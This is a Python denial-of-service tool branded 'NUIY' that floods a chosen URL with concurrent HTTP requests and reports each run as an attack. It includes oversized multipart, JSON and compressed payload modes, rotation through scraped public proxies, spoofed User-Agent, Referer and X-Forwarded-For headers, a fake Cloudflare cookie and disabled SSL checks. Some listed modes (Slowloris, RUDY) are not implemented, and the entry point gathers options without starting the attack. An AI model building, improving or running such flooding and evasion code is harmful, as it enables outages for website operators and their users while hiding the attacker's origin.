#!/usr/bin/env python3.11
# -*- coding: utf-8 -*-

import time
import asyncio
import aiohttp
import ssl
import random
import socket
import json
import gzip
import hashlib
import base64
from collections import Counter, deque
from urllib.parse import urlparse, urlencode
import sys
import os
import threading
from datetime import datetime, timedelta
import validators
from colorama import init, Fore, Back, Style
import socket

# Rich untuk dashboard
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    from rich.text import Text
    from rich import box
    from rich.columns import Columns
    from rich.align import Align
    from rich.style import Style as RichStyle
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print(f"{Fore.YELLOW}[WARN] Rich not installed. Installing...")
    os.system("pip install rich")
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    from rich.text import Text
    from rich import box
    from rich.columns import Columns
    from rich.align import Align
    from rich.style import Style as RichStyle
    RICH_AVAILABLE = True

# Initialize
init(autoreset=True)
console = Console()

# ==================== BANNER ====================
BANNER = r"""
════════════════════════════════════════════════════════════
█[0;91;1;47m▓▓▓▓▓▓▓▓▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0m
[0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m      [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0m
[0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0m
[0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0;37;40m    [0;91;1;47m▓▓[0;91;1;41m▌[0;90;1;40m▐[0m
[0;91;1;41m██▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m██▌[0;90;1;40m▐[0;37;40m [0;91;1;41m██▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m██▌[0;90;1;40m▐[0;37;40m [0;91;1;41m██▌[0;90;1;40m▐[0;37;40m [0;91;1;41m██████████▌[0;90;1;40m▐[0m
[0;91;1;41m▓▓▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m▓▓▌[0;90;1;40m▐[0;37;40m [0;91;1;41m▓▓▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m▓▓▌[0;90;1;40m▐[0;37;40m [0;91;1;41m▓▓▌[0;90;1;40m▐[0;37;40m         [0;91;1;41m▓▓▌[0;90;1;40m▐[0m
[0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m [0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m [0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m [0;91;1;41m▒▒▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m▒▒▌[0;90;1;40m▐[0m
[0;91;1;41m░░▌[0;90;1;40m▐[0;37;40m    [0;91;1;41m░░▌[0;90;1;40m▐[0;37;40m [0;91;1;41m░░░░░░░░░░▌[0;90;1;40m▐[0;37;40m [0;91;1;41m░░▌[0;90;1;40m▐[0;37;40m [0;91;1;41m░░░░░░░░░░▌[0;90;1;40m▐[0m

════════════════════════════════════════════════════════════
          
"""

# ==================== KONFIGURASI ====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.netflix.com/",
]

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://proxylist.rip/proxy/http/format/txt/",
]

# ==================== HELPER FUNCTIONS ====================
def resolve_ip(hostname: str) -> str:
    """Resolve hostname ke IP address"""
    try:
        # Hapus port jika ada
        host = hostname.split(':')[0]
        ip = socket.gethostbyname(host)
        return ip
    except:
        return "Unknown"

# ==================== LIVE STATS ====================
class LiveStats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.by_status = Counter()
        self.exceptions = Counter()
        self.latencies = deque(maxlen=1000)
        self.requests_per_second = deque(maxlen=60)
        self.start_time = time.time()
        self.last_update = time.time()
        self.lock = asyncio.Lock()
        self.is_running = True
        self.current_rate = 0
        self.peak_rate = 0
        self.total_sent_bytes = 0
        self.total_received_bytes = 0
        
    async def update(self, total_add=0, success_add=0, status=None, exception=None, latency=0, sent_bytes=0, recv_bytes=0):
        async with self.lock:
            self.total += total_add
            self.success += success_add
            self.failed += total_add - success_add
            if status is not None:
                self.by_status[status] += 1
            if exception:
                self.exceptions[exception] += 1
            if latency > 0:
                self.latencies.append(latency)
            self.total_sent_bytes += sent_bytes
            self.total_received_bytes += recv_bytes
            
            now = time.time()
            if now - self.last_update >= 1:
                self.current_rate = total_add / (now - self.last_update) if total_add > 0 else 0
                if self.current_rate > self.peak_rate:
                    self.peak_rate = self.current_rate
                self.requests_per_second.append(self.current_rate)
                self.last_update = now
    
    def get_stats(self):
        elapsed = time.time() - self.start_time
        avg_latency = sum(self.latencies) / len(self.latencies) if self.latencies else 0
        avg_rate = sum(self.requests_per_second) / len(self.requests_per_second) if self.requests_per_second else 0
        
        return {
            'total': self.total,
            'success': self.success,
            'failed': self.failed,
            'by_status': self.by_status,
            'exceptions': self.exceptions,
            'avg_latency': avg_latency,
            'avg_rate': avg_rate,
            'current_rate': self.current_rate,
            'peak_rate': self.peak_rate,
            'elapsed': elapsed,
            'success_rate': (self.success / self.total * 100) if self.total > 0 else 0,
            'total_sent_bytes': self.total_sent_bytes,
            'total_received_bytes': self.total_received_bytes
        }

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
    
    def fetch_proxies(self):
        print(f"{Fore.YELLOW}[NUIY] 🔥 Fetching proxies...")
        all_proxies = []
        
        for source in PROXY_SOURCES:
            try:
                import requests
                resp = requests.get(source, timeout=10)
                if resp.status_code == 200:
                    for line in resp.text.splitlines():
                        line = line.strip()
                        if line and ':' in line:
                            all_proxies.append(line)
            except:
                continue
        
        self.proxies = list(set(all_proxies))
        print(f"{Fore.GREEN}[NUIY] ✅ Loaded {len(self.proxies)} proxies")
        return self.proxies
    
    def get_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.current_index % len(self.proxies)]
            self.current_index += 1
            return proxy

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    @staticmethod
    def generate_gzip_bomb(size_mb=10):
        data = b"A" * (size_mb * 1024 * 1024 // 100)
        return gzip.compress(data)
    
    @staticmethod
    def generate_multipart_payload(num_files=50, file_size_kb=100):
        boundary = f"----WebKitFormBoundary{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
        parts = []
        for i in range(num_files):
            filename = f"file_{i}.bin"
            content = os.urandom(file_size_kb * 1024)
            part = f"--{boundary}\r\n"
            part += f'Content-Disposition: form-data; name="file_{i}"; filename="{filename}"\r\n'
            part += "Content-Type: application/octet-stream\r\n\r\n"
            parts.append(part.encode())
            parts.append(content)
            parts.append(b"\r\n")
        parts.append(f"--{boundary}--\r\n".encode())
        return b"".join(parts), f"multipart/form-data; boundary={boundary}"
    
    @staticmethod
    def generate_json_flood(depth=100):
        data = {"key": "value"}
        current = data
        for i in range(depth):
            current["nested"] = {"level": i, "data": "X" * 1024}
            current = current["nested"]
        data["large_array"] = ["Y" * 1024 for _ in range(50)]
        data["large_object"] = {f"key_{i}": "Z" * 1024 for i in range(100)}
        return json.dumps(data)

# ==================== TARGET FUNCTIONS ====================
def get_target(url: str) -> dict:
    if not validators.url(url):
        raise ValueError(f"URL tidak valid: {url}")
    parsed = urlparse(url)
    return {
        'uri': parsed.path or "/",
        'host': parsed.netloc,
        'scheme': parsed.scheme,
        'port': parsed.port or ("443" if parsed.scheme == "https" else "80"),
        'ip': resolve_ip(parsed.netloc)
    }

def build_headers(host: str, method: str, use_fingerprint=False, use_referer=False,
                  use_random_ip=False, use_cloudflare=False, custom_headers=None):
    headers = {
        'Host': host,
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'ja-JP,ja;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
    }
    if use_fingerprint:
        headers.update({
            'Sec-CH-UA': f'"Chromium";v="{random.randint(100,120)}", "Not=A?Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': random.choice(['Windows', 'macOS', 'Linux']),
        })
    if use_referer:
        headers['Referer'] = random.choice(REFERERS)
    if use_random_ip:
        random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers['X-Forwarded-For'] = random_ip
        headers['X-Real-IP'] = random_ip
    if use_cloudflare:
        headers['Cookie'] = f"__cfduid={hashlib.md5(str(random.random()).encode()).hexdigest()}"
    if custom_headers:
        headers.update(custom_headers)
    return headers

# ==================== ATTACK MODES ====================
class AttackMode:
    NORMAL = "normal"
    SLOWLORIS = "slowloris"
    RUDY = "rudy"
    GZIP_BOMB = "gzip_bomb"
    MULTIPART = "multipart"
    JSON_FLOOD = "json_flood"
    ALL = "all"

# ==================== WORKERS ====================
async def worker(session: aiohttp.ClientSession, url: str, method: str, end_ts: float,
                 headers: dict, payload: bytes | None, stats: LiveStats,
                 target_host: str, attack_mode: str, proxy_manager: ProxyManager = None,
                 use_ssl_bypass=False):
    
    while time.time() < end_ts and stats.is_running:
        status_code = None
        exception_name = None
        latency = 0
        current_proxy = None
        sent_bytes = 0
        recv_bytes = 0
        
        if proxy_manager and proxy_manager.proxies:
            proxy_addr = proxy_manager.get_proxy()
            if proxy_addr:
                current_proxy = f"http://{proxy_addr}"
        
        try:
            start_time = time.time()
            current_payload = payload
            headers_copy = headers.copy()
            
            if attack_mode == AttackMode.GZIP_BOMB:
                current_payload = PayloadGenerator.generate_gzip_bomb(random.randint(1, 5))
                headers_copy['Content-Encoding'] = 'gzip'
                headers_copy['Content-Type'] = 'application/gzip'
            elif attack_mode == AttackMode.MULTIPART:
                current_payload, content_type = PayloadGenerator.generate_multipart_payload(
                    random.randint(10, 30), random.randint(10, 50)
                )
                headers_copy['Content-Type'] = content_type
            elif attack_mode == AttackMode.JSON_FLOOD:
                current_payload = PayloadGenerator.generate_json_flood(random.randint(50, 150))
                headers_copy['Content-Type'] = 'application/json'
            
            if method.upper() == 'POST' and current_payload:
                sent_bytes = len(current_payload) if current_payload else 0
                async with session.post(url, headers=headers_copy, data=current_payload,
                                        proxy=current_proxy, ssl=ssl._create_unverified_context() if use_ssl_bypass else None) as resp:
                    content = await resp.read()
                    recv_bytes = len(content)
                    status_code = resp.status
                    latency = (time.time() - start_time) * 1000
                    await stats.update(1, 1 if 200 <= status_code < 400 else 0, status_code, None, latency, sent_bytes, recv_bytes)
            else:
                async with session.get(url, headers=headers_copy, proxy=current_proxy,
                                       ssl=ssl._create_unverified_context() if use_ssl_bypass else None) as resp:
                    content = await resp.read()
                    recv_bytes = len(content)
                    status_code = resp.status
                    latency = (time.time() - start_time) * 1000
                    await stats.update(1, 1 if 200 <= status_code < 400 else 0, status_code, None, latency, sent_bytes, recv_bytes)
                    
        except asyncio.TimeoutError:
            await stats.update(1, 0, None, "TimeoutError", 0)
        except Exception as e:
            await stats.update(1, 0, None, type(e).__name__, 0)
        
        await asyncio.sleep(random.uniform(0.001, 0.01))

# ==================== DASHBOARD ====================
def create_dashboard(stats_data: dict, duration: int, target: str, target_ip: str, 
                     concurrency: int, method: str, attack_mode: str, 
                     rate_limit: float, is_finished=False):
    
    elapsed = stats_data['elapsed']
    progress = (elapsed / duration * 100) if duration > 0 else 100 if is_finished else 0
    
    if is_finished:
        progress = 100
    
    # Main layout
    layout = Layout()
    layout.split(
        Layout(name="header", size=4),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="left", ratio=1),
        Layout(name="right", ratio=1)
    )
    layout["left"].split(
        Layout(name="stats", ratio=1),
        Layout(name="status_codes", ratio=1)
    )
    layout["right"].split(
        Layout(name="rates", ratio=1),
        Layout(name="exceptions", ratio=1)
    )
    
    # ==================== HEADER WITH URL & IP ====================
    status_text = "✅ COMPLETED" if is_finished else "🔄 RUNNING"
    status_color = "green" if is_finished else "yellow"
    
    header_text = Text()
    header_text.append("💜💖 NUIY  - DASHBOARD LIVE MONITOR\n", style="yellow")
    header_text.append(f"🌐 URL: ", style="cyan")
    header_text.append(f"{target}\n", style="bold white")
    header_text.append(f"📡 IP: ", style="cyan")
    header_text.append(f"{target_ip}\n", style="bold yellow")
    header_text.append(f"⏱️  Duration: {duration}s | ", style="cyan")
    header_text.append(f"🧵 Concurrency: {concurrency} | ", style="cyan")
    header_text.append(f"⚙️  Mode: {attack_mode} | ", style="cyan")
    header_text.append(status_text, style=status_color)
    
    layout["header"].update(Panel(header_text, style="red"))
    
    # Stats panel
    stats_table = Table(show_header=False, box=box.ROUNDED)
    stats_table.add_column("Metric", style="cyan")
    stats_table.add_column("Value", style="white")
    
    stats_table.add_row("Total", f"{stats_data['total']:,}")
    stats_table.add_row("Success", f"[green]{stats_data['success']:,}[/green]")
    stats_table.add_row("Failed", f"[red]{stats_data['failed']:,}[/red]")
    stats_table.add_row("Success Rate", f"[{'green' if stats_data['success_rate'] > 80 else 'yellow' if stats_data['success_rate'] > 50 else 'red'}]{stats_data['success_rate']:.1f}%[/]")
    stats_table.add_row("Avg Latency", f"{stats_data['avg_latency']:.1f}ms")
    stats_table.add_row("Total Sent", f"{stats_data['total_sent_bytes'] / 1024 / 1024:.2f} MB")
    stats_table.add_row("Total Received", f"{stats_data['total_received_bytes'] / 1024 / 1024:.2f} MB")
    stats_table.add_row("Elapsed", f"{elapsed:.0f}s / {duration}s")
    stats_table.add_row("Progress", f"{progress:.1f}%")
    
    layout["stats"].update(Panel(stats_table, title="📊 Attack Statistics", border_style="cyan"))
    
    # Status codes
    codes_table = Table(show_header=True, box=box.ROUNDED)
    codes_table.add_column("Status", style="cyan")
    codes_table.add_column("Count", style="white")
    codes_table.add_column("%", style="white")
    
    for code, count in sorted(stats_data['by_status'].items())[:10]:
        pct = (count / stats_data['total'] * 100) if stats_data['total'] > 0 else 0
        if 200 <= code < 400:
            color = "green"
        elif 400 <= code < 500:
            color = "yellow"
        else:
            color = "red"
        codes_table.add_row(f"[{color}]{code}[/]", f"{count:,}", f"{pct:.1f}%")
    
    layout["status_codes"].update(Panel(codes_table, title="🌐 Status Codes", border_style="yellow"))
    
    # Rates panel
    rates_table = Table(show_header=False, box=box.ROUNDED)
    rates_table.add_column("Metric", style="cyan")
    rates_table.add_column("Value", style="white")
    
    rates_table.add_row("Current Rate", f"[green]{stats_data['current_rate']:.1f}[/green] req/s")
    rates_table.add_row("Average Rate", f"{stats_data['avg_rate']:.1f} req/s")
    rates_table.add_row("Peak Rate", f"[magenta]{stats_data['peak_rate']:.1f}[/magenta] req/s")
    
    layout["rates"].update(Panel(rates_table, title="🚀 Request Rate", border_style="green"))
    
    # Exceptions panel
    exc_table = Table(show_header=True, box=box.ROUNDED)
    exc_table.add_column("Exception", style="cyan")
    exc_table.add_column("Count", style="white")
    
    for exc, count in stats_data['exceptions'].most_common(5):
        exc_table.add_row(f"[red]{exc}[/]", f"{count:,}")
    
    if not stats_data['exceptions']:
        exc_table.add_row("[green]No exceptions[/]", "")
    
    layout["exceptions"].update(Panel(exc_table, title="⚠️ Exceptions", border_style="red"))
    
    # Footer with progress bar
    progress_text = Text()
    bar_length = 50
    filled = int(progress / 100 * bar_length)
    bar = "█" * filled + "░" * (bar_length - filled)
    if is_finished:
        progress_text.append(f"\n{bar} 100% ✅ ATTACK COMPLETED!", style="bold green")
    else:
        progress_text.append(f"\n{bar} {progress:.1f}%", style="cyan")
    progress_text.append(f" | {stats_data['total']:,} requests | {stats_data['current_rate']:.1f} req/s", style="white")
    
    layout["footer"].update(Panel(progress_text, style="magenta"))
    
    return layout

# ==================== SUMMARY DISPLAY ====================
def print_summary(stats_data: dict, duration: int, target: str, target_ip: str,
                  concurrency: int, method: str, attack_mode: str, rate_limit: float):
    
    # Header
    console.print()
    console.print(Panel(
        Text("💜💖 NUIY - ATTACK SUMMARY", style="bold magenta"),
        border_style="red",
        width=70
    ))
    
    # Target Information
    target_table = Table(show_header=False, box=box.ROUNDED, title="🎯 TARGET INFORMATION")
    target_table.add_column("Field", style="cyan", width=15)
    target_table.add_column("Value", style="white")
    
    target_table.add_row("Target URL", target)
    target_table.add_row("Target IP", f"[yellow]{target_ip}[/yellow]")
    target_table.add_row("Attack Mode", attack_mode.upper())
    target_table.add_row("Method", method)
    target_table.add_row("Concurrency", str(concurrency))
    target_table.add_row("Duration", f"{duration}s")
    target_table.add_row("Rate Limit", str(rate_limit if rate_limit else "Unlimited"))
    target_table.add_row("Started", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    console.print(target_table)
    
    # Attack Results
    results_table = Table(show_header=False, box=box.ROUNDED, title="📊 ATTACK RESULTS")
    results_table.add_column("Metric", style="cyan", width=20)
    results_table.add_column("Value", style="white")
    
    # Color based on success rate
    success_rate = stats_data['success_rate']
    if success_rate > 80:
        success_color = "green"
    elif success_rate > 50:
        success_color = "yellow"
    else:
        success_color = "red"
    
    results_table.add_row("Total Requests", f"{stats_data['total']:,}")
    results_table.add_row("Successful", f"[green]{stats_data['success']:,} ([{success_color}]{success_rate:.1f}%[/])")
    results_table.add_row("Failed", f"[red]{stats_data['failed']:,}")
    
    # Status Codes
    if stats_data['by_status']:
        status_text = ""
        for code, count in sorted(stats_data['by_status'].items()):
            pct = (count / stats_data['total'] * 100) if stats_data['total'] > 0 else 0
            if 200 <= code < 400:
                color = "green"
            elif 400 <= code < 500:
                color = "yellow"
            else:
                color = "red"
            status_text += f"[{color}]{code}[/]: {count:,} ({pct:.1f}%)\n"
        results_table.add_row("Status Codes", status_text.strip())
    
    results_table.add_row("Average Rate", f"{stats_data['avg_rate']:.1f} req/s")
    results_table.add_row("Peak Rate", f"[magenta]{stats_data['peak_rate']:.1f}[/magenta] req/s")
    results_table.add_row("Average Latency", f"{stats_data['avg_latency']:.1f}ms")
    results_table.add_row("Total Sent", f"{stats_data['total_sent_bytes'] / 1024 / 1024:.2f} MB")
    results_table.add_row("Total Received", f"{stats_data['total_received_bytes'] / 1024 / 1024:.2f} MB")
    results_table.add_row("Duration", f"{stats_data['elapsed']:.1f}s")
    results_table.add_row("Finished", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
    
    console.print(results_table)
    
    # Exceptions
    if stats_data['exceptions']:
        exc_table = Table(show_header=True, box=box.ROUNDED, title="⚠️ EXCEPTIONS")
        exc_table.add_column("Exception", style="red")
        exc_table.add_column("Count", style="white")
        
        for exc, count in stats_data['exceptions'].most_common():
            exc_table.add_row(exc, f"{count:,}")
        
        console.print(exc_table)
    
    # Rating
    console.print()
    if stats_data['success_rate'] > 90:
        rating = "⭐" * 5 + " PERFECT ATTACK!"
        rating_color = "green"
    elif stats_data['success_rate'] > 70:
        rating = "⭐" * 4 + " GOOD ATTACK!"
        rating_color = "yellow"
    elif stats_data['success_rate'] > 50:
        rating = "⭐" * 3 + " MODERATE ATTACK"
        rating_color = "yellow"
    else:
        rating = "⭐" * 2 + " WEAK ATTACK - IMPROVE"
        rating_color = "red"
    
    console.print(Panel(
        Text(rating, style=f"bold {rating_color}"),
        border_style="magenta",
        width=70
    ))
    
    console.print()
    console.print(Text("💖💜 NUIY ....", style="cyan"))
    console.print()

# ==================== MAIN STRESS TEST ====================
async def run_stress_test(url: str, duration: int, concurrency: int, method: str,
                          rate_limit: float | None, headers: dict, target_host: str,
                          target_ip: str, attack_mode: str, use_proxy: bool = False,
                          use_ssl_bypass: bool = False):
    
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=15, sock_read=15)
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300,
                                     force_close=True, enable_cleanup_closed=True)
    stats = LiveStats()
    end_ts = time.time() + duration
    
    proxy_manager = None
    if use_proxy:
        proxy_manager = ProxyManager()
        proxy_manager.fetch_proxies()
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        for _ in range(concurrency):
            task = asyncio.create_task(
                worker(session, url, method, end_ts, headers, None, stats,
                      target_host, attack_mode, proxy_manager, use_ssl_bypass)
            )
            tasks.append(task)
        
        # Dashboard loop
        with Live(console=console, refresh_per_second=4, screen=True) as live:
            # Run dashboard while attack is running
            while stats.is_running and time.time() < end_ts:
                stats_data = stats.get_stats()
                layout = create_dashboard(stats_data, duration, url, target_ip,
                                         concurrency, method, attack_mode, 
                                         rate_limit, is_finished=False)
                live.update(layout)
                await asyncio.sleep(0.25)
            
            # Attack finished - stop workers
            stats.is_running = False
            
            # Cancel all tasks
            for task in tasks:
                task.cancel()
            
            # Wait for tasks to finish
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Get final stats
            stats_data = stats.get_stats()
            
            # Show final dashboard with COMPLETED status
            layout = create_dashboard(stats_data, duration, url, target_ip,
                                     concurrency, method, attack_mode, 
                                     rate_limit, is_finished=True)
            live.update(layout)
            
            # Wait a moment for user to see completion
            await asyncio.sleep(1.5)
    
    return stats.get_stats()

# ==================== LAUNCH ====================
def launch_attack(target_url: str, duration: int, concurrency: int = 50,
                  method: str = 'GET', rate_limit: float | None = None,
                  attack_mode: str = AttackMode.NORMAL, use_proxy: bool = False,
                  use_ssl_bypass: bool = False, use_fingerprint: bool = False,
                  use_referer: bool = False, use_random_ip: bool = False,
                  use_cloudflare: bool = False, custom_headers: dict = None):
    try:
        target = get_target(target_url)
        full_url = f"{target['scheme']}://{target['host']}{target['uri']}"
        target_ip = target['ip']
        headers = build_headers(target['host'], method, use_fingerprint, use_referer,
                                use_random_ip, use_cloudflare, custom_headers)
        
        print(f"{Fore.GREEN}[NUIY] 🎯 Attack started on {full_url}")
        print(f"{Fore.CYAN}📡 Target IP: {target_ip}")
        print(f"{Fore.CYAN}Mode: {attack_mode} | Threads: {concurrency} | Duration: {duration}s\n")
        
        stats_data = asyncio.run(
            run_stress_test(full_url, duration, concurrency, method, rate_limit,
                           headers, target['host'], target_ip, attack_mode, 
                           use_proxy, use_ssl_bypass)
        )
        
        # Print summary after attack
        console.clear()
        print_summary(stats_data, duration, full_url, target_ip, concurrency, 
                     method, attack_mode, rate_limit)
        
        # EXIT PROGRAM
        print(f"{Fore.GREEN}[💜💖 NUIY] ✅ Attack completed. Exiting...")
        sys.exit(0)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[💖💜 NUIY] ⚡ Attack stopped by user")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")
        sys.exit(1)

# ==================== MAIN ====================
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║             💜💖 NUIY - LIVE DASHBOARD                      ║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝\n")
    
    target_url = input(f"{Fore.YELLOW}URL Target: {Fore.WHITE}")
    while not validators.url(target_url):
        print(f"{Fore.RED}[ERROR] URL tidak valid!")
        target_url = input(f"{Fore.YELLOW}URL Target: {Fore.WHITE}")
    
    duration = int(input(f"{Fore.YELLOW}Duration (detik) [600]: {Fore.WHITE}") or "600")
    concurrency = int(input(f"{Fore.YELLOW}Concurrency [100]: {Fore.WHITE}") or "100")
    method = input(f"{Fore.YELLOW}HTTP Method [GET]: {Fore.WHITE}") or "GET"
    method = method.upper()
    
    rl = input(f"{Fore.YELLOW}Rate limit (kosong = no limit): {Fore.WHITE}")
    rate_limit = float(rl) if rl.strip() else None
    
    print(f"\n{Fore.MAGENTA}Attack Modes:")
    print(f"  1. {Fore.GREEN}Normal")
    print(f"  2. {Fore.YELLOW}Slowloris")
    print(f"  3. {Fore.YELLOW}RUDY")
    print(f"  4. {Fore.YELLOW}Gzip Bomb")
    print(f"  5. {Fore.YELLOW}Multipart")
    print(f"  6. {Fore.YELLOW}JSON Flood")
    print(f"  7. {Fore.RED}ALL")
    
    mode_choice = input(f"{Fore.YELLOW}Choose mode (1-7) [1]: {Fore.WHITE}") or "1"
    mode_map = {
        '1': AttackMode.NORMAL, '2': AttackMode.SLOWLORIS, '3': AttackMode.RUDY,
        '4': AttackMode.GZIP_BOMB, '5': AttackMode.MULTIPART,
        '6': AttackMode.JSON_FLOOD, '7': AttackMode.ALL,
    }
    attack_mode = mode_map.get(mode_choice, AttackMode.NORMAL)
    
    use_proxy = input(f"{Fore.YELLOW}Use proxy rotation? (y/n) [n]: {Fore.WHITE}").lower() == 'y'
    use_fingerprint = input(f"{Fore.YELLOW}Browser fingerprint? (y/n) [n]: {Fore.WHITE}").lower() == 'y'
    use_referer = input(f"{Fore.YELLOW}Referer spoofing? (y/n) [n]: {Fore.WHITE}").lower() == 'y'
    use_random_ip = input(f"{Fore.YELLOW}Random IP spoofing? (y/n) [n]: {Fore.WHITE}").lower() == 'y'
    use_cloudflare = input(f"{Fore.YELLOW}Cloudflare bypass? (y/n) [n]: {Fore.WHITE}").lower() == 'y'
    use_ssl_bypass = input(f"{Fore.YELLOW}Bypass SSL? (y/n) [y]: {Fore.WHITE}").lower() != 'n'
    
    custom_headers = {}
    if input(f"{Fore.YELLOW}Add custom headers? (y/n) [n]: {Fore.WHITE}").lower() == 'y':
        print(f"{Fore.CYAN}Enter headers (Key: Value). Type 'done' when finished:")
        while True:
            header = input(f"{Fore.YELLOW}Header: {Fore.WHITE}")
            if header.lower() == 'done':
                break
            if ':' in header:
                key, value = header.split(':', 1)
                custom_headers[key.strip()] = value.strip()
    
    print(f"\n{Fore.GREEN} 💖💜 NUIY Starting attack with Live Dashboard...\n")
    console.clear()
